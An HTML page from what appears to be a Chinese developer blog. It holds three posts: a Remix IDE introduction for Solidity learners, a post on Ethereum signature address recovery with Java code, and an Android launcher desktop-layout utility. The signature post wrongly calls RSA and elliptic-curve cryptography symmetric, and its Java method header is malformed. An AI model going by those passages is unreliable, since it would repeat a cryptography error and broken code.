  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/solidity/" rel="tag">solidity</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%88%E7%BA%A6/" rel="tag">合约</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%99%E7%A8%8B/" rel="tag">教程</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-区块链合约之10天学会solidity第一节-remix ide"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%B8%80%E8%8A%82-remix%20ide/"
    >区块链合约之10天学会solidity第一节-remix ide</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%B8%80%E8%8A%82-remix%20ide/" class="article-date">
  <time datetime="2022-04-28T10:11:20.000Z" itemprop="datePublished">2022-04-28</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/">技术生活 - 编程技术 - 区块链</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡起来，希望有人一起再次一起学习。学习学习，有输入和输出才能学的更好。所以，我计划，没两天更新一波学习记录。我会把学习记录写成系列文章，把代码放到github，期待一起进步。也请大家到我的GitHub 给我star呀！也欢迎给我留言加个好友啥的。如果给我star的，联系我我会拉个共同学习的群v（jingyiwei）。<br>GitHub：<a href="mailto:&#x67;&#105;&#116;&#x40;&#103;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#109;">&#x67;&#105;&#116;&#x40;&#103;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#109;</a>:it114&#x2F;learn-solidity-30day.git<br>本文原文发表在张智进博客：<a href="https://www.memestarter.top/">https://www.memestarter.top/</a></p>
<h1 id="合约ide"><a href="#合约ide" class="headerlink" title="合约ide"></a>合约ide</h1><p>和很多编程语言一样，当你问学过的人该用什么ide来开发。清高的人活着xx的人会告诉你：记事本也可以。对于新手来说，一款好的编译器能帮助初学者少走弯路，建立信心。回忆起我的初学之后，从最初的vs code 到 <a target="_blank" rel="noopener" href="https://remix.ethereum.org/">https://remix.ethereum.org/</a> 在线ide，再到remix 桌面ide，最后还是觉得桌面ide要要用一些。说一下优缺点吧 </p>
<ul>
<li>VS code<br>需要安装插件，而且这个插件还有不同的开发者开发的插件，初学者要去选择。代码变现到编译到部署，中间要用到几个插件，都需要要初学者去探索。</li>
<li>remix 在线ide<br>打开网址就能编写代码，同一个ide，几乎啥都不配置，可以执行编写，编译和部署等诸多步骤。上手快，无需下载，用完即走</li>
<li>remix 桌面ide<br>和在线的remix一样，不一样的是可以打开本地workspace还有一些高级功能待探索。</li>
</ul>
<h1 id="remix"><a href="#remix" class="headerlink" title="remix"></a>remix</h1><h2 id="认识工作区"><a href="#认识工作区" class="headerlink" title="认识工作区"></a>认识工作区</h2><p>工作区大致如下，各个区域的功能<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220430183656.png" alt="20220430183656"></p>
<p>在编译页面，重要的配置项<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220430183827.png" alt="20220430183827"></p>
<p>部署页面重要配置项<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220430184102.png" alt="20220430184102"></p>
<p>第一段就到这了，需要多练多写</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ide/" rel="tag">ide</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/solidity%E6%95%99%E7%A8%8B/" rel="tag">solidity教程</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%88%E7%BA%A6/" rel="tag">合约</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%99%E7%A8%8B/" rel="tag">教程</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-椭圆曲线签名之区块链签名验证"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/26/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%AD%BE%E5%90%8D%E4%B9%8B%E5%8C%BA%E5%9D%97%E9%93%BE%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/"
    >椭圆曲线签名之区块链签名验证</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/26/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%AD%BE%E5%90%8D%E4%B9%8B%E5%8C%BA%E5%9D%97%E9%93%BE%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/" class="article-date">
  <time datetime="2022-04-26T03:12:04.000Z" itemprop="datePublished">2022-04-26</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/">技术生活 - 编程技术 - 区块链</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h1><p>学过计算机的人都知道知名度rsa加密算法。它使用了两个数字相乘很容易，但是把一个大数字分解为素数却很难的这个原理，来实现对称加密。但是随着计算机的发展rsa的安全性越来越受到挑战。于是在bitcoin中一个叫做椭圆曲线算法的对称加密算法被使用，并且在长期实践中证明了其安全性。</p>
<h1 id="椭圆曲线算法"><a href="#椭圆曲线算法" class="headerlink" title="椭圆曲线算法"></a>椭圆曲线算法</h1><p>椭圆曲线密码术是一种基于离散对数问题的非对称或公钥密码体系，如椭圆曲线上的加法和乘法运算。作为一种对称加密算法，椭圆曲线算法比ras算法用更小的公钥，实现更高的效率，实现了更高的安全性。</p>
<p>数字签名在比特币中有三种用途。</p>
<ol>
<li>签名证明私钥的所有者，即资金所有者，已经授权支出这些资金。</li>
<li>授权证明是不可否认的 （不可否认性）</li>
<li>签名证明交易（或交易的具体部分）在签字之后没有也不能被任何人修改</li>
</ol>
<h2 id="算法介绍"><a href="#算法介绍" class="headerlink" title="算法介绍"></a>算法介绍</h2><p>这部分可以参考：精通以太坊 （中文版）：<a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/ethereum_book-zh/spilt.6.4e6f5cb249c84882.md">https://www.bookstack.cn/read/ethereum_book-zh/spilt.6.4e6f5cb249c84882.md</a></p>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h2 id="椭圆曲线算法实现"><a href="#椭圆曲线算法实现" class="headerlink" title="椭圆曲线算法实现"></a>椭圆曲线算法实现</h2><p>总的来说，首先要生成一个随机数根据K&#x3D;k*P ，来确定私钥。<br>具体的在数字签名的时候，区块链使用的算法和正规的椭圆曲线算法有一定的差异。经过签名的消息是可以被分解为 r ，s的。只靠rs所反解的public key会有四组，不过实际上最常见的是2组，因为另外两种出现的概率很低很低。这篇文章有具体的说明：<a target="_blank" rel="noopener" href="https://bitcoin.stackexchange.com/questions/38351/ecdsa-v-r-s-what-is-v">https://bitcoin.stackexchange.com/questions/38351/ecdsa-v-r-s-what-is-v</a> 。 </p>
<h2 id="椭圆曲线算法签名实现"><a href="#椭圆曲线算法签名实现" class="headerlink" title="椭圆曲线算法签名实现"></a>椭圆曲线算法签名实现</h2><p>下面是代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class Sign &#123;</span><br><span class="line"></span><br><span class="line">    public static final String PERSONAL_MESSAGE_PREFIX = &quot;\u0019Ethereum Signed Message:\n&quot;;</span><br><span class="line"></span><br><span class="line">    public static void RecoverAddress) &#123;</span><br><span class="line"></span><br><span class="line">        String signature = &quot;xxxx&quot;;</span><br><span class="line"></span><br><span class="line">        String address = &quot;yyyy&quot;;</span><br><span class="line">        String message = &quot;msg&quot;;</span><br><span class="line"></span><br><span class="line">        String prefix = PERSONAL_MESSAGE_PREFIX + message.length();</span><br><span class="line">        byte[] msgHash = Hash.sha3((prefix + message).getBytes());</span><br><span class="line"></span><br><span class="line">        byte[] signatureBytes = Numeric.hexStringToByteArray(signature);</span><br><span class="line">        byte v = signatureBytes[64];</span><br><span class="line">        if (v &lt; 27) &#123;</span><br><span class="line">            v += 27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SignatureData sd =</span><br><span class="line">                new SignatureData(</span><br><span class="line">                        v,</span><br><span class="line">                        (byte[]) Arrays.copyOfRange(signatureBytes, 0, 32),</span><br><span class="line">                        (byte[]) Arrays.copyOfRange(signatureBytes, 32, 64)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        String addressRecovered = null;</span><br><span class="line">        boolean match = false;</span><br><span class="line"></span><br><span class="line">        // Iterate for each possible key to recover</span><br><span class="line">        for (int i = 0; i &lt; 4; i++) &#123;</span><br><span class="line">            BigInteger publicKey =</span><br><span class="line">                    Sign.recoverFromSignature(</span><br><span class="line">                            (byte) i,</span><br><span class="line">                            new ECDSASignature(</span><br><span class="line">                                    new BigInteger(1, sd.getR()), new BigInteger(1, sd.getS())),</span><br><span class="line">                            msgHash);</span><br><span class="line"></span><br><span class="line">            if (publicKey != null) &#123;</span><br><span class="line">                addressRecovered = &quot;0x&quot; + Keys.getAddress(publicKey);</span><br><span class="line"></span><br><span class="line">                if (addressRecovered.equals(address)) &#123;</span><br><span class="line">                    match = true;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (addressRecovered.equals(address)) &#123;</span><br><span class="line">            System.out.println(&quot; recovered ... &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (match) &#123;</span><br><span class="line">            System.out.println(&quot; match ... &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure> 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/" rel="tag">数字签名</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-防沉迷app-项目总结2"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%932/"
    >防沉迷app-项目总结2</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%932/" class="article-date">
  <time datetime="2022-04-26T02:50:08.000Z" itemprop="datePublished">2022-04-26</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/">技术生活 - 编程技术 - 项目总结</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="防沉迷项目总结（2）"><a href="#防沉迷项目总结（2）" class="headerlink" title="防沉迷项目总结（2）"></a>防沉迷项目总结（2）</h1><h2 id="软件开发的需求变动问题"><a href="#软件开发的需求变动问题" class="headerlink" title="软件开发的需求变动问题"></a>软件开发的需求变动问题</h2><p>作为开发者，最不喜欢的场景是需求朝令夕改。频繁的需求改动对开发者的耐性和信心是极大的打击。</p>
<ol>
<li>心情：这个就不用多说了，开发是很枯燥的。让程序员重复做一个事情，不停的重复更枯燥。</li>
<li>设计问题：最初a需求的技术方案，开发者设计好了，需求变了之后，技术方案都有可能会受到影响。</li>
</ol>
<p>对于这个问题，目前是无解。市场是对的，老板也是对的，需求没错。所以就需要开发者提高自身素质，对潜在的需求变动要有前瞻性。在技术设计方面<br>对于可能的变动预留足够的弹性空间。</p>
<h3 id="一个被需求折磨的例子"><a href="#一个被需求折磨的例子" class="headerlink" title="一个被需求折磨的例子"></a>一个被需求折磨的例子</h3><p>需求a：桌面app只需要显示和隐藏<br>a基础上改动后的需求b：要初始化显示系统app，同时行列也要变化。</p>
<p>这块改动比较大，改动之前的就不贴代码了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"> package com.benny.openlauncher.util;</span><br><span class="line"></span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">import com.benny.openlauncher.AppObject;</span><br><span class="line">import com.benny.openlauncher.activity.HomeActivity;</span><br><span class="line">import com.benny.openlauncher.model.App;</span><br><span class="line">import com.benny.openlauncher.model.Item;</span><br><span class="line">import com.benny.openlauncher.widget.CellContainer;</span><br><span class="line">import com.benny.openlauncher.widget.Desktop;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">// 桌面app排列有关工具类</span><br><span class="line">public class DeskTopUtils &#123;</span><br><span class="line"></span><br><span class="line">    // 第一次初始化</span><br><span class="line">    public static void onCreate(List&lt;App&gt; apps) &#123;</span><br><span class="line">       // TODO </span><br><span class="line">    &#125;</span><br><span class="line">    // 添加到hide，并从数据库移除</span><br><span class="line">    public static void removeFromDesk(String pkg) &#123;</span><br><span class="line">        Log.d(&quot;DeskTopUtils&quot;,&quot;remove local app from desk pkg:&quot;+ pkg);</span><br><span class="line">        // hide 更新</span><br><span class="line">        ArrayList&lt;String&gt; hiddenList = AppSettings.get().getHiddenAppsList();</span><br><span class="line">        if(HomeActivity._db == null )return;</span><br><span class="line"></span><br><span class="line">        // 根据pkg找到app</span><br><span class="line">        List&lt;App&gt;  apps =  AppManager.getInstance(AppObject.get()).getNonFilteredApps();</span><br><span class="line">        App findApp = null;</span><br><span class="line">        for (App app : apps) &#123;</span><br><span class="line">            if (app.getComponentName().contains(pkg)) &#123;</span><br><span class="line">                findApp = app;</span><br><span class="line">                // 构造Intent string</span><br><span class="line">                HomeActivity._db.deleteItemByIntent(Tool.getIntentAsString(Tool.getIntentFromApp(findApp)));</span><br><span class="line">                Log.d(&quot;DeskTopUtils&quot;,&quot;remove find match local app &quot;+ findApp.getComponentName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if( findApp == null ) &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;removeFromDesk can&#x27;t find match local app &quot;+ pkg);</span><br><span class="line">            return;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;removeFromDesk find match local app &quot;+ findApp.getComponentName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 生成坐标</span><br><span class="line">    private static String genCoordinate(List&lt;List&lt;Item&gt;&gt; itemLists )&#123;</span><br><span class="line">        String coordinateStr =  &quot;&quot;;</span><br><span class="line">        for (int pageCount = 0; pageCount &lt; itemLists.size(); pageCount++) &#123;</span><br><span class="line">            List&lt;Item&gt; page = itemLists.get(pageCount);</span><br><span class="line">            for (int j = 0; j &lt; page.size(); j++) &#123;</span><br><span class="line">                coordinateStr += &quot;(&quot;+pageCount +&quot;,&quot; + page.get(j)._x+&quot;,&quot;+page.get(j)._y+&quot;);&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return coordinateStr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 从hide移除，并从desktop中选择合适位置，添加进去</span><br><span class="line">    public static void addToDesk(String pkg) &#123;</span><br><span class="line">        // hide 更新</span><br><span class="line">        ArrayList&lt;String&gt; hiddenList = AppSettings.get().getHiddenAppsList();</span><br><span class="line">        if(HomeActivity._db == null )return;</span><br><span class="line"></span><br><span class="line">        // 根据pkg找到app</span><br><span class="line">        List&lt;App&gt;  apps =  AppManager.getInstance(AppObject.get()).getNonFilteredApps();</span><br><span class="line">        App findApp = null;</span><br><span class="line">        for (App app : apps) &#123;</span><br><span class="line">            if (app.getComponentName().contains(pkg)) &#123;</span><br><span class="line">                findApp = app;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if( findApp == null ) &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;addToDesk can&#x27;t find match local app &quot;+ pkg);</span><br><span class="line">            return;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Log.d(&quot;DeskTopUtils&quot;,&quot;addToDesk find match local app &quot;+ findApp.getComponentName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 数据库更新</span><br><span class="line">        List&lt;CellContainer&gt; _pages = new ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;List&lt;Item&gt;&gt; desktopItems = HomeActivity._db.getDesktop();</span><br><span class="line"></span><br><span class="line">        String deskGrid = genCoordinate(desktopItems);</span><br><span class="line">        int row = AppSettings.get().getDesktopRowCount();</span><br><span class="line">        int col = AppSettings.get().getDesktopColumnCount();</span><br><span class="line"></span><br><span class="line">        // 查找每一个page中的合适位置</span><br><span class="line">        String t_point = &quot;&quot;;</span><br><span class="line">        int find_x = 0;</span><br><span class="line">        int find_y = 0;</span><br><span class="line">        boolean find = false;</span><br><span class="line"></span><br><span class="line">        // 倒序，刚容易找到位置，先这样</span><br><span class="line">        for (int pageCount = 0; pageCount &lt; desktopItems.size(); pageCount++) &#123;</span><br><span class="line">            List&lt;Item&gt; page = desktopItems.get(pageCount);</span><br><span class="line">            // 如果倒序，刚容易找到位置，先这样;取舍：这样可以在添加的时候，优先使用最前面的空缺位置</span><br><span class="line">            for( int j=0;j&lt;page.size();j++) &#123;</span><br><span class="line">                //尝试在每一个元素周边寻找区域</span><br><span class="line">                Item t_item = page.get(j);</span><br><span class="line">                int t_x = t_item._x;</span><br><span class="line">                int t_y = t_item._y;</span><br><span class="line">                // 右边</span><br><span class="line">                int tx_top = t_x-1;</span><br><span class="line">                if( tx_top &gt;=0 ) &#123;</span><br><span class="line">                    t_point = &quot;(&quot; +pageCount+&quot;,&quot;+tx_top+&quot;,&quot;+t_y+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x = tx_top;</span><br><span class="line">                        find_y = t_y;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 左边</span><br><span class="line">                tx_top = t_x +1;</span><br><span class="line">                if( tx_top &gt;=0 &amp;&amp; tx_top &lt; col )&#123;</span><br><span class="line">                    t_point = &quot;(&quot;+pageCount+&quot;,&quot;+tx_top+&quot;,&quot;+t_y+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x = tx_top;</span><br><span class="line">                        find_y = t_y;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 上边</span><br><span class="line">                int ty_top = t_y -1;</span><br><span class="line">                if( ty_top &gt;=0 )&#123;</span><br><span class="line">                    t_point = &quot;(&quot;+pageCount+&quot;,&quot;+t_x+&quot;,&quot;+ty_top+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x  = t_x;</span><br><span class="line">                        find_y = ty_top;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 下边</span><br><span class="line">                ty_top = t_y + 1;</span><br><span class="line">                if( ty_top &gt;=0 &amp;&amp; ty_top &lt; row)&#123;</span><br><span class="line">                    t_point = &quot;(&quot;+pageCount+&quot;,&quot;+t_x+&quot;,&quot;+ty_top+&quot;)&quot;;</span><br><span class="line">                    if( !deskGrid.contains( t_point ) ) &#123;</span><br><span class="line">                        find_x  = t_x;</span><br><span class="line">                        find_y = ty_top;</span><br><span class="line">                        find = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Item newItem = Item.newAppItem(findApp);</span><br><span class="line">            newItem._spanY = 1;</span><br><span class="line">            newItem._spanX = 1;</span><br><span class="line">            if( find ) &#123;</span><br><span class="line">                newItem._x = find_x;</span><br><span class="line">                newItem._y = find_y;</span><br><span class="line">                HomeActivity._db.saveItem(newItem, pageCount, Definitions.ItemPosition.Desktop);</span><br><span class="line">                Log.d(&quot;DeskTopUtils&quot;,&quot;addToDesk find location to locate app  page,x,y=&quot;+pageCount +&quot;,&quot; +find_x+&quot;,&quot;+ find_y +&quot;，package=&quot;+Tool.getIntentAsString(newItem._intent));</span><br><span class="line">                break;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 新建一个页面，放置app</span><br><span class="line">                if ( pageCount == desktopItems.size()-1 ) &#123;</span><br><span class="line">                    int newPage = pageCount + 1;</span><br><span class="line">                    newItem._x = 0;</span><br><span class="line">                    newItem._y = 0;</span><br><span class="line">                    HomeActivity._db.saveItem(newItem, newPage, Definitions.ItemPosition.Desktop);</span><br><span class="line">                    Log.d(&quot;DeskTopUtils&quot;, &quot;addToDesk no location , new page ,  page,x,y=&quot; + newPage + &quot;,&quot; + find_x + &quot;,&quot; + find_y + &quot;，package=&quot; + Tool.getIntentAsString(newItem._intent));</span><br><span class="line">                    break;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    Log.d(&quot;DeskTopUtils&quot;, &quot;addToDesk no location , query new page try&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
